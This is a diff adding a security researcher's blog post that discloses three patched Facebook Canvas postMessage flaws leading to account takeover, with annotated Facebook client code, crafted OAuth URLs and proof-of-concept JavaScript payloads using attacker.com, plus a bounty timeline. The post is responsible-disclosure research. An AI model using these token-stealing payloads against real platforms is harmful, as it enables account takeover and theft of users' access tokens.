@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>More secure Facebook Canvas : Tale of $126k worth of bugs that lead to Facebook Account Takeovers | Youssef Sammouda (sam0) personal blog</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="More secure Facebook Canvas : Tale of $126k worth of bugs that lead to Facebook Account Takeovers" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Summery Facebook allowed online games owners to host their games/applications in apps.facebook.com for many years now. The idea and technology behind it was that the game ( Flash or HTML5 based) would be hosted in the owner website and later the website page hosting it should be shown to the Facebook user in apps.facebook.com inside a controlled iframe. Since the game is not hosted in Facebook and for best user experience like keeping score and profile data, Facebook had to establish a communication channel with the game owner to verify the identity of the Facebook user for example. This was ensured by using cross windows communication/messaging between apps.facebook.com and the game website inside the iframe. In this blog post, i&#39;ll be discussing multiple vulnerabilities i found in this implementation. Vulnerabilities potential These bugs were found after careful auditing of the client-side code inside apps.facebook.com responsible of verifying what&#39;s coming through this channel. The bugs explained below (and others) allowed me to takeover any Facebook account if the user decided to visit my game page inside apps.facebook.com. The severity of these bugs is high since these were present for years and billions of user and their information could have been compromised easily since this was served from inside Facebook. Facebook confirmed they didn&#39;t see any indicators of previous abuse or exploitation of these bugs. For Researchers Before explaining the actual bugs below, i tried to show the way i decomposed the code and a simplified path to track the flow of the message data and how its components will be used. I probably didn&#39;t left much to dig but i hope the information shared could help you in your research. If you are only interested in the bugs themselves then jump to each bug section part. Description So far we know that the game page being served inside an iframe in apps.facebook.com is communicating with the parent window to ask Facebook to do some actions. Among the requested actions , for example , is to show a dialog to the user that would allow him to confirm the usage of the Facebook application owned by the game developers which would help me to identify you and get some information from an access token that they&#39;ll receive if the user decided to user the application. The script responsible of receiving the cross window messages, interpreting them and understanding the action demanded is below ( only necessary parts are shown and as they were before the bugs were fixed ) : __d(&quot;XdArbiter&quot;, ... handleMessage: function(a, b, e) { d(&quot;Log&quot;).debug(&quot;XdArbiter at &quot; + (window.name != null &amp;&amp; window.name !== &quot;&quot; ? window.name : window == top ? &quot;top&quot; : &quot;[no name]&quot;) + &quot; handleMessage &quot; + JSON.stringify(a)); if (typeof a === &quot;string&quot; &amp;&amp; /^FB_RPC:/.test(a)) { k.enqueue([a.substring(7), { origin: b, source: e || i[h] }]); ... send: function(a, b, e) { var f = e in i ? e : h; a = typeof a === &quot;string&quot; ? a : c(&quot;QueryString&quot;).encode(a); b = b; try { d(&quot;SecurePostMessage&quot;).sendMessageToSpecificOrigin(b, a, e) } catch (a) { d(&quot;Log&quot;).error(&quot;XdArbiter: Proxy for %s not available, page might have been navigated: %s&quot;, f, a.message), delete i[f] } return !0 } ..." />
+<meta property="og:description" content="Summery Facebook allowed online games owners to host their games/applications in apps.facebook.com for many years now. The idea and technology behind it was that the game ( Flash or HTML5 based) would be hosted in the owner website and later the website page hosting it should be shown to the Facebook user in apps.facebook.com inside a controlled iframe. Since the game is not hosted in Facebook and for best user experience like keeping score and profile data, Facebook had to establish a communication channel with the game owner to verify the identity of the Facebook user for example. This was ensured by using cross windows communication/messaging between apps.facebook.com and the game website inside the iframe. In this blog post, i&#39;ll be discussing multiple vulnerabilities i found in this implementation. Vulnerabilities potential These bugs were found after careful auditing of the client-side code inside apps.facebook.com responsible of verifying what&#39;s coming through this channel. The bugs explained below (and others) allowed me to takeover any Facebook account if the user decided to visit my game page inside apps.facebook.com. The severity of these bugs is high since these were present for years and billions of user and their information could have been compromised easily since this was served from inside Facebook. Facebook confirmed they didn&#39;t see any indicators of previous abuse or exploitation of these bugs. For Researchers Before explaining the actual bugs below, i tried to show the way i decomposed the code and a simplified path to track the flow of the message data and how its components will be used. I probably didn&#39;t left much to dig but i hope the information shared could help you in your research. If you are only interested in the bugs themselves then jump to each bug section part. Description So far we know that the game page being served inside an iframe in apps.facebook.com is communicating with the parent window to ask Facebook to do some actions. Among the requested actions , for example , is to show a dialog to the user that would allow him to confirm the usage of the Facebook application owned by the game developers which would help me to identify you and get some information from an access token that they&#39;ll receive if the user decided to user the application. The script responsible of receiving the cross window messages, interpreting them and understanding the action demanded is below ( only necessary parts are shown and as they were before the bugs were fixed ) : __d(&quot;XdArbiter&quot;, ... handleMessage: function(a, b, e) { d(&quot;Log&quot;).debug(&quot;XdArbiter at &quot; + (window.name != null &amp;&amp; window.name !== &quot;&quot; ? window.name : window == top ? &quot;top&quot; : &quot;[no name]&quot;) + &quot; handleMessage &quot; + JSON.stringify(a)); if (typeof a === &quot;string&quot; &amp;&amp; /^FB_RPC:/.test(a)) { k.enqueue([a.substring(7), { origin: b, source: e || i[h] }]); ... send: function(a, b, e) { var f = e in i ? e : h; a = typeof a === &quot;string&quot; ? a : c(&quot;QueryString&quot;).encode(a); b = b; try { d(&quot;SecurePostMessage&quot;).sendMessageToSpecificOrigin(b, a, e) } catch (a) { d(&quot;Log&quot;).error(&quot;XdArbiter: Proxy for %s not available, page might have been navigated: %s&quot;, f, a.message), delete i[f] } return !0 } ..." />
+<link rel="canonical" href="http://localhost:4000/uncategorized/2021/09/03/more-secure-facebook-canvas-applications-tale-of-126k-worth-of-bugs-that-lead-to-facebook-account-takeovers.html" />
+<meta property="og:url" content="http://localhost:4000/uncategorized/2021/09/03/more-secure-facebook-canvas-applications-tale-of-126k-worth-of-bugs-that-lead-to-facebook-account-takeovers.html" />
+<meta property="og:site_name" content="Youssef Sammouda (sam0) personal blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-09-03T03:22:42+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="More secure Facebook Canvas : Tale of $126k worth of bugs that lead to Facebook Account Takeovers" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-09-03T03:22:42+01:00","datePublished":"2021-09-03T03:22:42+01:00","description":"Summery Facebook allowed online games owners to host their games/applications in apps.facebook.com for many years now. The idea and technology behind it was that the game ( Flash or HTML5 based) would be hosted in the owner website and later the website page hosting it should be shown to the Facebook user in apps.facebook.com inside a controlled iframe. Since the game is not hosted in Facebook and for best user experience like keeping score and profile data, Facebook had to establish a communication channel with the game owner to verify the identity of the Facebook user for example. This was ensured by using cross windows communication/messaging between apps.facebook.com and the game website inside the iframe. In this blog post, i&#39;ll be discussing multiple vulnerabilities i found in this implementation. Vulnerabilities potential These bugs were found after careful auditing of the client-side code inside apps.facebook.com responsible of verifying what&#39;s coming through this channel. The bugs explained below (and others) allowed me to takeover any Facebook account if the user decided to visit my game page inside apps.facebook.com. The severity of these bugs is high since these were present for years and billions of user and their information could have been compromised easily since this was served from inside Facebook. Facebook confirmed they didn&#39;t see any indicators of previous abuse or exploitation of these bugs. For Researchers Before explaining the actual bugs below, i tried to show the way i decomposed the code and a simplified path to track the flow of the message data and how its components will be used. I probably didn&#39;t left much to dig but i hope the information shared could help you in your research. If you are only interested in the bugs themselves then jump to each bug section part. Description So far we know that the game page being served inside an iframe in apps.facebook.com is communicating with the parent window to ask Facebook to do some actions. Among the requested actions , for example , is to show a dialog to the user that would allow him to confirm the usage of the Facebook application owned by the game developers which would help me to identify you and get some information from an access token that they&#39;ll receive if the user decided to user the application. The script responsible of receiving the cross window messages, interpreting them and understanding the action demanded is below ( only necessary parts are shown and as they were before the bugs were fixed ) : __d(&quot;XdArbiter&quot;, ... handleMessage: function(a, b, e) { d(&quot;Log&quot;).debug(&quot;XdArbiter at &quot; + (window.name != null &amp;&amp; window.name !== &quot;&quot; ? window.name : window == top ? &quot;top&quot; : &quot;[no name]&quot;) + &quot; handleMessage &quot; + JSON.stringify(a)); if (typeof a === &quot;string&quot; &amp;&amp; /^FB_RPC:/.test(a)) { k.enqueue([a.substring(7), { origin: b, source: e || i[h] }]); ... send: function(a, b, e) { var f = e in i ? e : h; a = typeof a === &quot;string&quot; ? a : c(&quot;QueryString&quot;).encode(a); b = b; try { d(&quot;SecurePostMessage&quot;).sendMessageToSpecificOrigin(b, a, e) } catch (a) { d(&quot;Log&quot;).error(&quot;XdArbiter: Proxy for %s not available, page might have been navigated: %s&quot;, f, a.message), delete i[f] } return !0 } ...","headline":"More secure Facebook Canvas : Tale of $126k worth of bugs that lead to Facebook Account Takeovers","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/uncategorized/2021/09/03/more-secure-facebook-canvas-applications-tale-of-126k-worth-of-bugs-that-lead-to-facebook-account-takeovers.html"},"url":"http://localhost:4000/uncategorized/2021/09/03/more-secure-facebook-canvas-applications-tale-of-126k-worth-of-bugs-that-lead-to-facebook-account-takeovers.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Youssef Sammouda (sam0) personal blog" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Youssef Sammouda (sam0) personal blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">More secure Facebook Canvas : Tale of $126k worth of bugs that lead to Facebook Account Takeovers</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2021-09-03T03:22:42+01:00" itemprop="datePublished">Sep 3, 2021
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><!-- wp:paragraph --></p>
+<p><strong>Summery</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Facebook allowed online games owners to host their games/applications in apps.facebook.com for many years now. The idea and technology behind it was that the game ( Flash or HTML5 based) would be hosted in the owner website and later the website page hosting it should be shown to the Facebook user in apps.facebook.com inside a controlled iframe. Since the game is not hosted in Facebook and for best user experience like keeping score and profile data, Facebook had to establish a communication channel with the game owner to verify the identity of the Facebook user for example. This was ensured by using cross windows communication/messaging between apps.facebook.com and the game website inside the iframe. In this blog post, i'll be discussing multiple vulnerabilities i found in this implementation.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong>Vulnerabilities potential</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>These bugs were found after careful auditing of the client-side code inside apps.facebook.com responsible of verifying what's coming through this channel. The bugs explained below (and others) allowed me to takeover any Facebook account if the user decided to visit my game page inside apps.facebook.com. The severity of these bugs is high since these were present for years and billions of user and their information could have been compromised easily since this was served from inside Facebook. Facebook confirmed they didn't see any indicators of previous abuse or exploitation of these bugs.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong>For Researchers</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Before explaining the actual bugs below, i tried to show the way i decomposed the code and a simplified path to track the flow of the message data and how its components will be used. I probably didn't left much to dig but i hope the information shared could help you in your research. If you are only interested in the bugs themselves then jump to each bug section part.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong>Description</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>So far we know that the game page being served inside an iframe in apps.facebook.com is communicating with the parent window to ask Facebook to do some actions. Among the requested actions , for example , is to show a dialog to the user that would allow him to confirm the usage of the Facebook application owned by the game developers which would help me to identify you and get some information from an access token that they'll receive if the user decided to user the application. The script responsible of receiving the cross window messages, interpreting them and understanding the action demanded is below ( only necessary parts are shown and as they were before the bugs were fixed ) :</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code {"lineNumbers":true} --></p>
+<pre class="wp-block-code"><code lang="javascript" class="language-javascript line-numbers">__d("XdArbiter", ...
+            handleMessage: function(a, b, e) {
+                d("Log").debug("XdArbiter at " + (window.name != null &amp;&amp; window.name !== "" ? window.name : window == top ? "top" : "[no name]") + " handleMessage " + JSON.stringify(a));
+                if (typeof a === "string" &amp;&amp; /^FB_RPC:/.test(a)) {
+                    k.enqueue([a.substring(7), {
+                        origin: b,
+                        source: e || i[h]
+                    }]);
+           ...
+            send: function(a, b, e) {
+                var f = e in i ? e : h;
+                a = typeof a === "string" ? a : c("QueryString").encode(a);
+                b = b;
+                try {
+                    d("SecurePostMessage").sendMessageToSpecificOrigin(b, a, e)
+                } catch (a) {
+                    d("Log").error("XdArbiter: Proxy for %s not available, page might have been navigated: %s", f, a.message), delete i[f]
+                }
+                return !0
+            }
+...
+
+    window.addEventListener("message", function(a) {
+        if (a.data.xdArbiterSyn) d("SecurePostMessage").sendMessageAllowAnyOrigin_UNSAFE(a.source, {
+            xdArbiterAck: !0
+        });
+        else if (a.data.xdArbiterRegister) {
+            var b = l.register(a.source, a.data.xdProxyName, a.data.origin, a.origin);
+            d("SecurePostMessage").sendMessageAllowAnyOrigin_UNSAFE(a.source, {
+                xdArbiterRegisterAck: b
+            })
+        } else a.data.xdArbiterHandleMessage &amp;&amp; l.handleMessage(a.data.message, a.data.origin, a.source)
+}), 98);
+
+__d("JSONRPC", ...
+        c.read = function(a, c) {
+            ...
+            e = this.local[a.method];
+            try {
+                e = e.apply(c || null, a.params);
+                typeof e !== "undefined" &amp;&amp; g("result", e)
+            ...
+    e.exports = a
+}), null);
+
+__d("PlatformAppController", ...
+function f(a, b, e) { ...
+         c("PlatformDialogClient").async(f, a, function(d) { ... b(d) });
+}...
+t.local.showDialog = f;
+
+...
+
+t = new(c("JSONRPC"))(function(a, b) {
+            var d = b.origin || k;
+            b = b.source;
+            if (b == null) {
+                var e = c("ge")(j);
+                b = e.contentWindow
+            }
+            c("XdArbiter").send("FB_RPC:" + a, b, d)
+        }
+...
+
+<meta http-equiv="content-type" content="text/html; charset=utf-8">}), null);
+
+__d("PlatformDialogClient", ...
+function async(a, b, e) {
+        var f = c("guid")(),
+            g = b.state;
+        b.state = f;
+        b.redirect_uri = new(c("URI"))("/dialog/return/arbiter").setSubdomain("www").setFragment(c("QueryString").encode({
+            origin: b.redirect_uri
+        })).getQualifiedURI().toString();
+        b.display = "async";
+        j[f] = {
+            callback: e || function() {},
+            state: g
+        };
+        e = "POST";
+        d("AsyncDialog").send(new(c("AsyncRequest"))(this.getURI(a, b)).setMethod(e).setReadOnly(!0).setAbortHandler(k(f)).setErrorHandler(l(f)))
+    }
+...
+function <meta http-equiv="content-type" content="text/html; charset=utf-8">getURI(a, b) {
+        if (b.version) {
+            var d = new(c("URI"))("/" + b.version + "/dialog/" + a);
+            delete b.version;
+            return d.addQueryData(b)
+        }
+        return c("PlatformVersioning").versionAwareURI(new(c("URI"))("/dialog/" + a).addQueryData(b))
+    }
+
+}), 98);
+
+</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>To simplify the code for you to understand the flow in case someone decides to dig more into it and looks for more bugs : </p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Iframe sends message to parent <strong>=></strong> Message event dispatched in <meta http-equiv="content-type" content="text/html; charset=utf-8">XdArbiter <strong>=></strong>  Message handler function passes data to handleMessage function <strong>=> </strong>"enqueue" function passes to <meta http-equiv="content-type" content="text/html; charset=utf-8">JSONRPC => <meta http-equiv="content-type" content="text/html; charset=utf-8">JSONRPC.read calls this.local.<meta http-equiv="content-type" content="text/html; charset=utf-8">showDialog function in <meta http-equiv="content-type" content="text/html; charset=utf-8">PlatformAppController <strong>=></strong> function checks message and if all valid, call <meta http-equiv="content-type" content="text/html; charset=utf-8">PlatformDialogClient <strong>=></strong> <meta http-equiv="content-type" content="text/html; charset=utf-8">PlatformDialogClient.async sends a POST request to <strong>apps.facebook.com/dialog/oauth</strong> , returned access_token would be passed to <meta http-equiv="content-type" content="text/html; charset=utf-8">XdArbiter.send function ( few steps were skipped ) <strong>=></strong> <meta http-equiv="content-type" content="text/html; charset=utf-8"> <meta http-equiv="content-type" content="text/html; charset=utf-8">XdArbiter.send would send a cross window message to the iframe window <strong>=></strong> Event dispatched in iframe window containing Facebook user access_token</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Below an example of a simple code to construct the message to be sent to apps.facebook.com from the iframe, a similar one would be send from any game page using the Facebook Javascript SDK but with more unnecessary parts:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code lang="javascript" class="language-javascript"> msg = JSON.stringify({"jsonrpc":"2.0",
+                                    "method":"showDialog",
+                                    "id":1,
+                                    "params":[{"method":"permissions.oauth","display":"async","redirect_uri":"https://ysamm.com/callback","app_id":"APP_ID","client_id":"<meta http-equiv="content-type" content="text/html; charset=utf-8">APP_ID","response_type":"token"}]})
+                fullmsg = {xdArbiterHandleMessage:true,message:"FB_RPC:" + msg , origin: IFRAME_ORIGIN}
+window.parent.postMessage(fullmsg,"*");</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>Interested parts to manipulate are : <br>- <strong>IFRAME_ORIGIN</strong>, which is the one to be used in the redirect_uri parameter send with the POST request to apps.facebook.com/dialog/oauth to be verified server-side that it's a domain owned by the application requesting an access_token, then would be used as targetOrigin in postMessage  to send a cross window message to the iframe with the access_token<br>- Keys and values of the object inside <strong>params</strong> , there are the parameters to be appended to <meta http-equiv="content-type" content="text/html; charset=utf-8">apps.facebook.com/dialog/oauth. Most interesting ones are redirect_uri ( which can replace <meta http-equiv="content-type" content="text/html; charset=utf-8"><strong>IFRAME_ORIGIN</strong> in the POST request in some cases ) and <meta http-equiv="content-type" content="text/html; charset=utf-8"><strong>APP_ID</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong>Attacks vectors/scenarios</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>What we'll do here is to try to instead of requesting an access token for the game application we own, we'll try to get one of a Facebook first party application like Instagram. What's holding us back is although we control the <meta http-equiv="content-type" content="text/html; charset=utf-8">IFRAME_ORIGIN and <meta http-equiv="content-type" content="text/html; charset=utf-8">APP_ID which we can set to match the Instagram application as www.instagram.com and 124024574287414, later the message sent to the iframe containing the first party access token would have a targetOrigin in postMessage as www.instagram.com which is not our window origin. Facebook did a good job protecting against these attacks ( i'll argue though to why not using the origin from the event message received and matching app_id to the hosted game instead of giving us total freedom which could have prevented all these bugs ), but apparently they left some weaknesses that could have been exploited for many years.      </p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph {"fontSize":"large"} --></p>
+<p class="has-large-font-size"><strong>Bug 1: Parameter Pollution, it was checked server-side and we <strong>definitely</strong> should trust it</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>This bug occurs due to the fact that the POST request to&nbsp;<strong>https://apps.facebook.com/dialog/oauth</strong>&nbsp;when constructed from the received message from the iframe, could contain user controlled parameters. <br>All parameters are checked in the client-side ( PlatformAppController, showDialog method and ,PlatformDialogClient.async method) and duplicate parameters will be removed in PlatformAppController , also AsyncRequest module seems to be doing some filtering ( removing parameters that already exist but brackets were appended to it ). <br><br>However due to some missing checking in the server-side, a parameter name set to <strong>PARAM[random</strong> would replace a previously set parameter <strong>PARAM</strong> ; for example <strong>redirect_uri[0</strong> parameter value would replace <strong>redirect_uri</strong>. We can abuse this as follow : <br>1) Set <strong>APP_ID</strong> to be the Instagram application id. <br>2) The redirect_uri will be constructed in PlatformDialogClient.async (Line 72 ) using <meta http-equiv="content-type" content="text/html; charset=utf-8"><strong>IFRAME_ORIGIN</strong> ( will end up <strong>https://www.facebook.com/dialog/return/arbiter#origin=https://attacker.com</strong> ) , which would be sent matching our iframe window origin but won't be used at all as explained below. <br>3) Set <strong>redirect_uri[0</strong> in <strong>params</strong> as an additional parameter ( order matters so it must be after <strong>redirect_uri</strong> ) to be <strong>https://www.instagram.com/accounts/signup</strong>/ which is a valid redirect_uri for the Instagram applicaiton.<br>The URL of the POST request end up being something like this:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code lang="javascript" class="language-javascript">https://apps.facebook.com/dialog/oauth?state=f36be3f648ddfb&amp;display=async&amp;redirect_uri=https://www.facebook.com/dialog/return/arbiter#origin=https://attacker.com&amp;app_id=124024574287414&amp;client_id=124024574287414&amp;response_type=token&amp;redirect_uri[0=https://www.instagram.com/accounts/signup/</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p>The request would end up being successful and returning a first party access token since <meta http-equiv="content-type" content="text/html; charset=utf-8">redirect_uri[0 replaces redirect_uri and it's a valid redirect_uri. In the client side though, the logic is if an access_token was received it means that the origin used to construct the redirect_uri did work with the app_id and for that it should trust it and use to send the message to the iframe, behind the scenes though redirect_uri[0 was used and not redirect_uri ( Cool right?)<br><br><strong>Proof of concept</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code lang="javascript" class="language-javascript"><meta http-equiv="content-type" content="text/html; charset=utf-8">xmsg = JSON.stringify({"jsonrpc":"2.0",
+                                    "method":"showDialog",
+                                    "id":1,
+                                    "params":[{"method":"permissions.oauth","display":"async","redirect_uri":"https://attacker.com/callback","app_id":"124024574287414","client_id":"<meta http-equiv="content-type" content="text/html; charset=utf-8">124024574287414","response_type":"token","redirect_uri[0":"https://www.instagram.com/accounts/signup/"}]})
+                fullmsg = {xdArbiterHandleMessage:true,message:"FB_RPC:" + xmsg , origin: "https://attacker.com"}
+window.parent.postMessage(fullmsg,"*");</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph {"fontSize":"large"} --></p>
+<p class="has-large-font-size"><strong>Bug 2: Why bothering, Origin is undefined</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>The main problem for this one is that /dialog/oauth endpoint would accept&nbsp;<strong>https://www.facebook.com/dialog/return/arbiter</strong>&nbsp;as a valid redirect_uri ( without a valid origin in the fragment part ) for third-party applications and some first-party ones.<br>The second problem is that this behaviour to occur ( no origin in the fragment part ), the message sent from the iframe to&nbsp;<strong>apps.facebook.com</strong>&nbsp;should not contain a.data.origin ( <meta http-equiv="content-type" content="text/html; charset=utf-8"><strong>IFRAME_ORIGIN</strong> is undefined ) , however this same value would be used later to send a cross window message to the iframe, if <strong>null</strong> or <strong>undefined</strong> is used, the message won't be received. <br>Likely, i noticed that <strong>JSONRPC</strong> function would always receive a not null origin of the postMessage ( Line 55 ) . Since b.origin is undefined or null, <strong>k </strong>would be chosen. <strong>k</strong> could be set by the attacker by first registering a valid origin via <strong>c("Arbiter").subscribe("XdArbiter/register")</strong> which could be informed if our message had <strong>xdArbiterRegister</strong> and a specified origin . Before "<strong>k</strong>" variable is set, the supplied origin would be checked first if it belongs to the attacker application using "<strong>/platform/app_owned_url_check/</strong>" endpoint.<br>This is wrong and the second problem occurs here since we can't ensure that the user in the next cross origin message sent from the iframe would supply the same <strong>APP_ID</strong>.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Not all first-party applications are vulnerable to this though. I used the Facebook Watch for Android application or Portal to get a first party access_token. </p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>The URL of the POST request would be something like this: </p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code lang="javascript" class="language-javascript"><meta http-equiv="content-type" content="text/html; charset=utf-8">https://apps.facebook.com/dialog/oauth?state=f36be3f648ddfb&amp;display=async&amp;redirect_uri=<meta http-equiv="content-type" content="text/html; charset=utf-8">https://www.facebook.com/dialog/return/arbiter&amp;app_id=<meta http-equiv="content-type" content="text/html; charset=utf-8">1348564698517390&amp;client_id=<meta http-equiv="content-type" content="text/html; charset=utf-8">1348564698517390&amp;response_type=token</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong>Proof Of Concept</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code lang="javascript" class="language-javascript">window.parent.postMessage({xdArbiterRegister:true,origin:"https://attacker.com"},"*")
+
+<meta http-equiv="content-type" content="text/html; charset=utf-8">xmsg = JSON.stringify({"jsonrpc":"2.0",
+                                    "method":"showDialog",
+                                    "id":1,
+                                    "params":[{"method":"permissions.oauth","display":"async","app_id":"1348564698517390","client_id":"<meta http-equiv="content-type" content="text/html; charset=utf-8">1348564698517390","response_type":"token"}]})
+                fullmsg = {xdArbiterHandleMessage:true,message:"FB_RPC:" + xmsg}
+window.parent.postMessage(fullmsg,"*");</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph {"fontSize":"large"} --></p>
+<p class="has-large-font-size"><strong>Bug 3</strong>: <strong>Total</strong> <strong>Chaos</strong>, <strong>version can't be harmful</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>This bug one occurs in <strong>PlatformDialogClient.getURI</strong> function which is responsible of setting the API version before /dialog/oauth endpoint. This function didn't check for double dots or added paths and directly constructed a URI object to be used later to send an XHR request ( Line 86 ).<br>The <strong>version</strong> property in <strong>params</strong> passed in the cross window message sent to&nbsp;<strong>apps.facebook.com</strong>&nbsp;could be set to <strong>api/graphql/?doc_id=DOC_ID&amp;variables=VAR#</strong> and would eventually lead to a POST request sent to the GraphQL endpoint with valid user CSRF token.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong>DOC_ID</strong> and <strong>VAR</strong> could be set to an id of a GraphQL Mutation to add a phone number to the attacount, and the variables of this mutation.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>The URL of the POST request would be something like this: </p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code lang="javascript" class="language-javascript">https://apps.facebook.com/api/graphql?doc_id=DOC_ID&amp;variables=VAR&amp;?/dialog/oauth&amp;state=f36be3f648ddfb&amp;display=async&amp;redirect_uri=https://www.facebook.com/dialog/return/arbiter#origin=attacker&amp;app_id=1348564698517390&amp;client_id=1348564698517390&amp;response_type=token</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong>Proof Of Concept</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code lang="javascript" class="language-javascript"><meta http-equiv="content-type" content="text/html; charset=utf-8">xmsg = JSON.stringify({"jsonrpc":"2.0",
+                                    "method":"showDialog",
+                                    "id":1,
+                                    "params":[{"method":"permissions.oauth","display":"async","client_id":"<meta http-equiv="content-type" content="text/html; charset=utf-8">APP_ID","response_type":"token","version":"<meta http-equiv="content-type" content="text/html; charset=utf-8">api/graphql?doc_id=DOC_ID&amp;variables=VAR&amp;"}]})
+                fullmsg = {xdArbiterHandleMessage:true,message:"FB_RPC:" + xmsg , origin: "https://attacker.com"}
+window.parent.postMessage(fullmsg,"*");</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong>Timeline</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:list {"ordered":true} --></p>
+<ol>
+<li>Aug 4, 2021&mdash; Report Sent <br><meta http-equiv="content-type" content="text/html; charset=utf-8">Aug 4, 2021&mdash;  Acknowledged by Facebook<br><meta http-equiv="content-type" content="text/html; charset=utf-8">Aug 6, 2021&mdash; Fixed by Facebook<br>Sep 2, 2021 &mdash; $42000 bounty  awarded by Facebook.</li>
+<li>Aug 9, 2021&mdash; Report Sent <br><meta http-equiv="content-type" content="text/html; charset=utf-8">Aug 9, 2021&mdash;  Acknowledged by Facebook<br><meta http-equiv="content-type" content="text/html; charset=utf-8">Aug 12, 2021&mdash; Fixed by Facebook<br>Aug 31, 2021 &mdash; $42000 bounty  awarded by Facebook.</li>
